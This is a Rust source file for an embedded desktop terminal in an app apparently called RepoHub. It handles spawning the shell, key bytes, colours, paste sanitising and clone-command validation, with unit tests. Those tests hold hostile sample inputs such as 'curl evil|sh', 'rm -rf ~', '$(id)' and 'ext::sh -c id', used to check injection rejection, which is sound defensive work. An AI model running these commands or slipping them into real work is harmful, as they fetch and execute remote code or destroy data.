//! An embedded terminal (desktop only): your login shell in a real pseudo-terminal, opened in
//! the repository's local clone, so `claude`, `git` and your other tools run with the right
//! working directory and environment.
//!
//! `portable-pty` runs the shell (ConPTY on Windows); `vt100` keeps the screen (colours, cursor,
//! scrollback) that the view draws. The web build has no way to start processes on your
//! computer, so there `Term::spawn` returns an error and the tab explains why.
use rune::Color;

/// One run of cells with the same look.
#[derive(Clone, Debug, PartialEq)]
pub struct Run {
    pub text: String,
    pub fg: Option<Color>,
    pub bg: Option<Color>,
    pub bold: bool,
}

/// What the view draws: rows of runs (the cursor is drawn as an inverted cell).
#[derive(Clone, Debug, Default)]
pub struct Screen {
    pub rows: Vec<Vec<Run>>,
}

/// Pasted text as it's safe to send: line breaks as Return, and no control characters.
///
/// A program that asked for bracketed paste gets the text between `ESC[200~` and `ESC[201~`
/// and treats it as text. An `ESC[201~` inside the paste would end that early, and what
/// follows would run as if typed. So escape and the other control characters are dropped
/// (tab and line breaks stay), as xterm does.
pub fn clean_paste(text: &str) -> String {
    text.replace("\r\n", "\r").replace('\n', "\r").chars().filter(|c| !c.is_control() || matches!(c, '\r' | '\t')).collect()
}

/// The command that clones `url` into a folder `name` and goes into it.
///
/// It is typed into a shell, and both values come from the API (a GitHub Enterprise server
/// allows names github.com doesn't). Only plain addresses and names are accepted, so nothing
/// in them can be read by the shell as another command.
pub fn clone_command(url: &str, name: &str) -> Result<String, String> {
    let plain = |s: &str| !s.is_empty() && !s.starts_with(['-', '.']) && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'));
    let path_ok = url.strip_prefix("https://").is_some_and(|rest| {
        let mut parts = rest.split('/');
        let host_ok = parts.next().is_some_and(|h| {
            let (host, port) = h.split_once(':').unwrap_or((h, "0"));
            plain(host) && !port.is_empty() && port.chars().all(|c| c.is_ascii_digit())
        });
        let segs: Vec<&str> = parts.collect();
        host_ok && segs.len() >= 2 && segs.iter().all(|s| plain(s))
    });
    if !path_ok || !plain(name) {
        return Err(format!("RepoHub won't type this clone command: the repository's address or name has unusual characters ({url}). Clone it yourself, then pick the folder."));
    }
    Ok(format!("git clone -- {url}.git {name} && cd {name}\r"))
}

/// What a key pressed in the terminal means for the app, before the shell gets it.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum TermKey {
    /// It goes to the shell.
    Shell,
    /// Ctrl+Shift+Tab: leave the terminal, so the keyboard reaches the rest of the app.
    Leave,
    /// One of the app's own shortcuts (⌘/Ctrl+K and the page shortcuts), which work everywhere.
    App,
}

pub fn term_key(ev: &rune::KeyEvent) -> TermKey {
    if ev.key == rune::Key::Tab && ev.mods.ctrl && ev.mods.shift {
        return TermKey::Leave;
    }
    // Ctrl+R (reverse search) and the other control keys stay the shell's.
    if ['k', '1', '2', '3', '4', '5', ','].iter().any(|c| ev.is_command(*c)) && !ev.mods.shift && !ev.mods.alt {
        return TermKey::App;
    }
    TermKey::Shell
}

/// Bytes a key sends to the shell, xterm-style.
pub fn key_bytes(ev: &rune::KeyEvent) -> Option<Vec<u8>> {
    use rune::Key;
    let m = &ev.mods;
    let app = |s: &str| Some(s.as_bytes().to_vec());
    match &ev.key {
        Key::Text(t) if m.ctrl && !m.alt && t.len() == 1 => ctrl_byte(t.chars().next()?),
        // Alt+letter is Meta (ESC prefix). Any other character typed with Alt/Option or AltGr is
        // just that character: @ # [ ] { } on Italian, German and other layouts.
        Key::Text(t) if m.alt && t.len() == 1 && t.as_bytes()[0].is_ascii_alphanumeric() => Some([b"\x1b".as_slice(), t.as_bytes()].concat()),
        Key::Text(t) => Some(t.as_bytes().to_vec()),
        // Off macOS, Ctrl+V pastes (the app's paste handler types the clipboard into the shell).
        Key::Command('v' | 'V') if m.cmd && !cfg!(target_os = "macos") => None,
        // Off macOS, Ctrl+letter arrives as Command: those are terminal control keys.
        Key::Command(c) if m.ctrl => ctrl_byte(*c),
        Key::Enter => app("\r"),
        Key::Backspace => Some(if m.alt { b"\x1b\x7f".to_vec() } else { vec![0x7f] }),
        Key::Delete => app("\x1b[3~"),
        Key::Tab if m.shift => app("\x1b[Z"),
        Key::Tab => app("\t"),
        Key::Escape => app("\x1b"),
        Key::Up => app("\x1b[A"),
        Key::Down => app("\x1b[B"),
        Key::Right if m.alt => app("\x1bf"),
        Key::Left if m.alt => app("\x1bb"),
        Key::Right => app("\x1b[C"),
        Key::Left => app("\x1b[D"),
        Key::Home => app("\x1b[H"),
        Key::End => app("\x1b[F"),
        Key::PageUp => app("\x1b[5~"),
        Key::PageDown => app("\x1b[6~"),
        Key::Function(n @ 1..=4) => Some(format!("\x1bO{}", (b'P' + n - 1) as char).into_bytes()),
        Key::Function(n @ 5..=12) => {
            let code = [15, 17, 18, 19, 20, 21, 23, 24][(*n - 5) as usize];
            Some(format!("\x1b[{code}~").into_bytes())
        }
        _ => None,
    }
}

fn ctrl_byte(c: char) -> Option<Vec<u8>> {
    let c = c.to_ascii_lowercase();
    match c {
        'a'..='z' => Some(vec![c as u8 - b'a' + 1]),
        '[' => Some(vec![0x1b]),
        '\\' => Some(vec![0x1c]),
        ']' => Some(vec![0x1d]),
        ' ' | '@' => Some(vec![0]),
        _ => None,
    }
}

/// The 16 ANSI colours (One Dark-ish on dark backgrounds, GitHub-ish on light ones).
fn ansi(i: u8, dark: bool) -> Color {
    const DARK: [u32; 16] = [0x3b4048, 0xe06c75, 0x98c379, 0xe5c07b, 0x61afef, 0xc678dd, 0x56b6c2, 0xdcdfe4,
        0x5c6370, 0xef7b84, 0xa8d38a, 0xf0cc8a, 0x74bdf5, 0xd38be8, 0x66c9d5, 0xffffff];
    const LIGHT: [u32; 16] = [0x24292f, 0xcf222e, 0x116329, 0x7d4e00, 0x0969da, 0x8250df, 0x1b7c83, 0x6e7781,
        0x57606a, 0xa40e26, 0x1a7f37, 0x633c01, 0x218bff, 0xa475f9, 0x3192aa, 0x8c959f];
    let v = if dark { DARK[i as usize & 15] } else { LIGHT[i as usize & 15] };
    rgb(v)
}

fn rgb(v: u32) -> Color {
    rune::color::hex(&format!("#{v:06x}")).unwrap_or(Color::WHITE)
}

/// A terminal colour index (0–255) as a colour.
pub fn indexed(i: u8, dark: bool) -> Color {
    match i {
        0..=15 => ansi(i, dark),
        16..=231 => {
            let i = i - 16;
            let step = |n: u8| if n == 0 { 0 } else { 55 + n as u32 * 40 };
            rgb((step(i / 36) << 16) | (step((i / 6) % 6) << 8) | step(i % 6))
        }
        _ => {
            let g = 8 + (i as u32 - 232) * 10;
            rgb((g << 16) | (g << 8) | g)
        }
    }
}

#[cfg(not(target_arch = "wasm32"))]
mod native {
    use std::io::{Read, Write};
    use std::path::{Path, PathBuf};
    use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
    use std::sync::{Arc, Mutex};

    use portable_pty::{CommandBuilder, MasterPty, PtySize, native_pty_system};

    use super::{Run, Screen, indexed};

    fn nz(n: u16) -> std::num::NonZeroU16 {
        std::num::NonZeroU16::new(n.max(1)).expect("non-zero")
    }

    pub struct Term {
        writer: Box<dyn Write + Send>,
        master: Box<dyn MasterPty + Send>,
        child: Box<dyn portable_pty::Child + Send + Sync>,
        parser: Arc<Mutex<vt100::Parser>>,
        generation: Arc<AtomicU64>,
        pub cwd: PathBuf,
        pub size: (u16, u16),
        pub exited: Arc<AtomicBool>,
        pub scroll: usize,
    }

    /// The user's shell: `$SHELL`, else zsh/bash (PowerShell on Windows).
    pub(crate) fn shell() -> CommandBuilder {
        let mut c = if cfg!(windows) {
            CommandBuilder::new("powershell.exe")
        } else {
            let sh = std::env::var("SHELL").ok().filter(|s| Path::new(s).exists())
                .or_else(|| ["/bin/zsh", "/bin/bash", "/bin/sh"].iter().find(|p| Path::new(p).exists()).map(|s| s.to_string()))
                .unwrap_or_else(|| "/bin/sh".into());
            let mut c = CommandBuilder::new(sh);
            c.arg("-l"); // a login shell, so PATH has Homebrew, nvm, cargo… like a normal terminal
            c
        };
        crate::config::scrub_pty_env(&mut c);
        c
    }

    pub(crate) fn screen_from_vt100(s: &vt100::Screen, scroll: usize, dark: bool) -> Screen {
        let (rows, cols) = s.size();
        let (rows, cols) = (u16::from(rows), u16::from(cols));
        let colour = |c: vt100::Color| match c {
            vt100::Color::Default => None,
            vt100::Color::Idx(i) => Some(indexed(i, dark)),
            vt100::Color::Rgb(r, g, b) => Some(rune::Color { r: r as f32 / 255.0, g: g as f32 / 255.0, b: b as f32 / 255.0, a: 1.0 }),
        };
        let cursor = (!s.hide_cursor() && scroll == 0).then(|| s.cursor_position());
        let mut out = Vec::with_capacity(rows as usize);
        for r in 0..rows {
            let mut runs: Vec<Run> = Vec::new();
            for c in 0..cols {
                let Some(cell) = s.cell(r, c) else { continue };
                if cell.is_wide_continuation() {
                    continue;
                }
                let (mut fg, mut bg) = (colour(cell.fgcolor()), colour(cell.bgcolor()));
                let inverted = cell.inverse() || cursor == Some((r, c));
                if inverted {
                    std::mem::swap(&mut fg, &mut bg);
                    fg = Some(fg.unwrap_or(if dark { rune::Color { r: 0.07, g: 0.08, b: 0.1, a: 1.0 } } else { rune::Color::WHITE }));
                    bg = Some(bg.unwrap_or(if dark { rune::Color { r: 0.86, g: 0.87, b: 0.89, a: 1.0 } } else { rune::Color { r: 0.14, g: 0.16, b: 0.18, a: 1.0 } }));
                }
                let text = if cell.has_contents() { cell.contents().to_string() } else { " ".to_string() };
                let bold = cell.bold();
                let blank = !inverted && text == " ";
                match runs.last_mut() {
                    Some(last) if last.fg == fg && last.bg == bg && last.bold == bold => last.text.push_str(&text),
                    Some(last) if blank && last.bg == bg => last.text.push(' '),
                    Some(last) if !blank && last.bg == bg && last.text.bytes().all(|b| b == b' ') => {
                        last.fg = fg;
                        last.bold = bold;
                        last.text.push_str(&text);
                    }
                    _ => runs.push(Run { text, fg, bg, bold }),
                }
            }
            // Trailing plain spaces carry nothing.
            if let Some(last) = runs.last_mut()
                && last.bg.is_none()
            {
                let trimmed = last.text.trim_end().len();
                last.text.truncate(trimmed);
                if last.text.is_empty() {
                    runs.pop();
                }
            }
            out.push(runs);
        }
        Screen { rows: out }
    }

    impl Term {
        /// Starts the shell in `cwd`, optionally providing `GITHUB_TOKEN` if opted in. `on_output`
        /// runs on the reader thread after new output, coalesced: it isn't called again until `ack` is.
        pub fn spawn(cwd: &Path, rows: u16, cols: u16, token: Option<&str>, on_output: impl Fn() + Send + 'static) -> Result<Term, String> {
            let pty = native_pty_system();
            let size = PtySize { rows, cols, pixel_width: 0, pixel_height: 0 };
            let pair = pty.openpty(size).map_err(|e| format!("Couldn't open a terminal: {e}"))?;
            let mut cmd = shell();
            cmd.cwd(cwd);
            cmd.env("TERM", "xterm-256color");
            cmd.env("COLORTERM", "truecolor");
            cmd.env("REPOHUB", "1");
            if let Some(tok) = token {
                cmd.env("GITHUB_TOKEN", tok);
            }
            let child = pair.slave.spawn_command(cmd).map_err(|e| format!("Couldn't start the shell: {e}"))?;
            drop(pair.slave);
            let mut reader = pair.master.try_clone_reader().map_err(|e| e.to_string())?;
            let writer = pair.master.take_writer().map_err(|e| e.to_string())?;
            let parser = Arc::new(Mutex::new(vt100::Parser::new(nz(rows), nz(cols), 5000)));
            let generation = Arc::new(AtomicU64::new(1));
            let exited = Arc::new(AtomicBool::new(false));
            let (p, g, done) = (parser.clone(), generation.clone(), exited.clone());
            std::thread::spawn(move || {
                let mut buf = [0u8; 16 * 1024];
                loop {
                    match reader.read(&mut buf) {
                        Ok(0) | Err(_) => break,
                        Ok(n) => {
                            if let Ok(mut p) = p.lock() {
                                p.process(&buf[..n]);
                            }
                            g.fetch_add(1, Ordering::Release);
                            on_output();
                        }
                    }
                }
                done.store(true, Ordering::SeqCst);
                g.fetch_add(1, Ordering::Release);
                on_output();
            });
            Ok(Term { writer, master: pair.master, child, parser, generation, cwd: cwd.to_path_buf(), size: (rows, cols), exited, scroll: 0 })
        }

        /// Monotonic generation bumped whenever screen contents, size, or scrollback change.
        pub fn generation(&self) -> u64 {
            self.generation.load(Ordering::Acquire)
        }

        pub fn write(&mut self, bytes: &[u8]) {
            if self.scroll != 0 {
                self.scroll = 0;
                self.generation.fetch_add(1, Ordering::Release);
            }
            if let Ok(mut p) = self.parser.lock() {
                p.screen_mut().set_scrollback(0);
            }
            let _ = self.writer.write_all(bytes);
            let _ = self.writer.flush();
        }

        /// Types text as if pasted (bracketed when the program asked for it).
        pub fn paste(&mut self, text: &str) {
            let bracketed = self.parser.lock().map(|p| p.screen().bracketed_paste()).unwrap_or(false);
            let t = super::clean_paste(text);
            if bracketed {
                self.write(format!("\x1b[200~{t}\x1b[201~").as_bytes());
            } else {
                self.write(t.as_bytes());
            }
        }

        pub fn resize(&mut self, rows: u16, cols: u16) {
            if (rows, cols) == self.size || rows < 2 || cols < 10 {
                return;
            }
            self.size = (rows, cols);
            let _ = self.master.resize(PtySize { rows, cols, pixel_width: 0, pixel_height: 0 });
            if let Ok(mut p) = self.parser.lock() {
                p.screen_mut().set_size(nz(rows), nz(cols));
            }
            self.generation.fetch_add(1, Ordering::Release);
        }

        /// Scrolls the view back into history by `lines` (negative: towards the present).
        pub fn scroll_by(&mut self, lines: i32) {
            if let Ok(mut p) = self.parser.lock() {
                let target = (self.scroll as i32 + lines).max(0) as usize;
                p.screen_mut().set_scrollback(target);
                let next = p.screen().scrollback();
                if next != self.scroll {
                    self.scroll = next;
                    self.generation.fetch_add(1, Ordering::Release);
                }
            }
        }

        pub fn is_running(&self) -> bool {
            !self.exited.load(Ordering::SeqCst)
        }

        /// The text on screen, one line per row, without trailing spaces or blank lines.
        pub fn text(&self) -> String {
            let Ok(p) = self.parser.lock() else { return String::new() };
            let lines: Vec<String> = p.screen().contents().lines().map(|l| l.trim_end().to_owned()).collect();
            lines.join("\n").trim_end().to_owned()
        }

        /// The current screen, as runs of same-looking cells.
        pub fn screen(&self, dark: bool) -> Screen {
            let Ok(p) = self.parser.lock() else { return Screen::default() };
            screen_from_vt100(p.screen(), self.scroll, dark)
        }
    }

    impl Drop for Term {
        fn drop(&mut self) {
            let _ = self.child.kill();
        }
    }
}

#[cfg(not(target_arch = "wasm32"))]
pub use native::Term;
#[cfg(all(test, not(target_arch = "wasm32")))]
pub(crate) use native::{screen_from_vt100, shell};

/// The web build can't start processes on your computer.
#[cfg(target_arch = "wasm32")]
pub struct Term {
    pub cwd: std::path::PathBuf,
    pub size: (u16, u16),
    pub scroll: usize,
}

#[cfg(target_arch = "wasm32")]
impl Term {
    pub fn spawn(_: &std::path::Path, _: u16, _: u16, _: Option<&str>, _: impl Fn() + Send + 'static) -> Result<Term, String> {
        Err("The terminal needs the desktop app.".into())
    }
    pub fn generation(&self) -> u64 {
        0
    }
    pub fn write(&mut self, _: &[u8]) {}
    pub fn paste(&mut self, _: &str) {}
    pub fn resize(&mut self, _: u16, _: u16) {}
    pub fn scroll_by(&mut self, _: i32) {}
    pub fn is_running(&self) -> bool {
        false
    }
    pub fn screen(&self, _: bool) -> Screen {
        Screen::default()
    }
    pub fn text(&self) -> String {
        String::new()
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn some_keys_belong_to_the_app_and_one_leaves_the_terminal() {
        use rune::{Key, KeyEvent, Mods};
        let ev = |key: Key, mods: Mods| KeyEvent { key, mods };
        let ctrl = Mods { cmd: true, ctrl: true, ..Mods::default() };
        assert_eq!(super::term_key(&ev(Key::Command('k'), ctrl)), super::TermKey::App);
        assert_eq!(super::term_key(&ev(Key::Command('3'), ctrl)), super::TermKey::App);
        assert_eq!(super::term_key(&ev(Key::Command(','), ctrl)), super::TermKey::App);
        assert_eq!(super::term_key(&ev(Key::Command('r'), ctrl)), super::TermKey::Shell, "reverse search stays the shell's");
        assert_eq!(super::term_key(&ev(Key::Command('c'), ctrl)), super::TermKey::Shell);
        assert_eq!(super::term_key(&ev(Key::Tab, Mods { ctrl: true, shift: true, ..Mods::default() })), super::TermKey::Leave);
        assert_eq!(super::term_key(&ev(Key::Tab, Mods::default())), super::TermKey::Shell, "Tab completes in the shell");
        assert_eq!(super::term_key(&ev(Key::Escape, Mods::default())), super::TermKey::Shell);
    }

    #[test]
    fn a_paste_cant_end_itself_or_carry_control_characters() {
        // The clipboard holds text that tries to close the bracketed paste and run a command.
        let t = super::clean_paste("ls\x1b[201~curl evil|sh\r\nnext\tcol\u{9b}201~\x07\x00");
        assert!(!t.contains('\x1b') && !t.contains('\u{9b}') && !t.contains('\x07') && !t.contains('\0'));
        assert_eq!(t, "ls[201~curl evil|sh\rnext\tcol201~");
        assert_eq!(super::clean_paste("a\nb\r\nc"), "a\rb\rc");
        assert_eq!(super::clean_paste("caffè ✓"), "caffè ✓");
    }

    #[test]
    fn clone_commands_take_plain_addresses_only() {
        assert_eq!(super::clone_command("https://github.com/octo/demo.rs", "demo.rs").unwrap(), "git clone -- https://github.com/octo/demo.rs.git demo.rs && cd demo.rs\r");
        assert!(super::clone_command("https://ghe.example:8443/team/sub/app", "app").is_ok());
        for (url, name) in [
            ("https://github.com/octo/x; curl evil|sh", "x; curl evil|sh"),
            ("https://github.com/octo/demo", "demo && rm -rf ~"),
            ("https://github.com/octo/demo", "$(id)"),
            ("https://github.com/octo/demo", "-oProxyCommand=x"),
            ("https://github.com/octo/demo", ".."),
            ("https://github.com/octo/`id`", "demo"),
            ("https://github.com/octo/de mo", "demo"),
            ("ext::sh -c id", "demo"),
            ("http://github.com/octo/demo", "demo"),
            ("https://github.com/demo", "demo"),
            ("https://github.com:x/octo/demo", "demo"),
            ("https://github.com/octo/demo", ""),
        ] {
            assert!(super::clone_command(url, name).is_err(), "{url} {name}");
        }
    }

    use super::*;
    use rune::{Key, KeyEvent};

    fn ev(key: Key, ctrl: bool) -> KeyEvent {
        KeyEvent { key, mods: rune::Mods { ctrl, ..Default::default() } }
    }

    #[test]
    fn keys() {
        assert_eq!(key_bytes(&ev(Key::Text("a".into()), false)), Some(b"a".to_vec()));
        assert_eq!(key_bytes(&ev(Key::Command('c'), true)), Some(vec![3]));
        assert_eq!(key_bytes(&ev(Key::Enter, false)), Some(b"\r".to_vec()));
        assert_eq!(key_bytes(&ev(Key::Up, false)), Some(b"\x1b[A".to_vec()));
        let alt = |t: &str| KeyEvent { key: Key::Text(t.into()), mods: rune::Mods { alt: true, ..Default::default() } };
        assert_eq!(key_bytes(&alt("@")), Some(b"@".to_vec()));
        assert_eq!(key_bytes(&alt("b")), Some(b"\x1bb".to_vec()));
        assert_eq!(indexed(196, true), rgb(0xff0000));
    }

    #[cfg(unix)]
    #[test]
    fn runs_a_command_in_the_folder() {
        let dir = std::env::temp_dir();
        let mut t = Term::spawn(&dir, 24, 80, None, || {}).expect("shell starts");
        t.write(b"echo repohub-$((40+2)); pwd\r");
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
        let mut text = String::new();
        while std::time::Instant::now() < deadline {
            text = t.screen(true).rows.iter().map(|r| r.iter().map(|x| x.text.as_str()).collect::<String>()).collect::<Vec<_>>().join("\n");
            if text.contains("repohub-42") {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
        assert!(text.contains("repohub-42"), "screen was:\n{text}");
        assert!(t.text().contains("repohub-42"));
        assert!(text.contains(dir.to_string_lossy().trim_end_matches('/')), "screen was:\n{text}");
    }

    #[cfg(not(target_arch = "wasm32"))]
    #[test]
    fn spaces_between_same_style_runs_merge() {
        let rows = std::num::NonZeroU16::new(4).unwrap();
        let cols = std::num::NonZeroU16::new(40).unwrap();
        let mut p = vt100::Parser::new(rows, cols, 0);
        // Leading plain spaces + two green words separated by a reset space, hide cursor.
        p.process(b"\x1b[?25l  \x1b[32mtest\x1b[0m \x1b[32mok\x1b[0m");
        let scr = super::screen_from_vt100(p.screen(), 0, true);
        assert_eq!(scr.rows[0].len(), 1, "spaces with matching background merge into one run: {:?}", scr.rows[0]);
        assert_eq!(scr.rows[0][0].text, "  test ok");
        assert!(scr.rows[1].is_empty(), "empty rows drop empty trailing runs");
    }
}
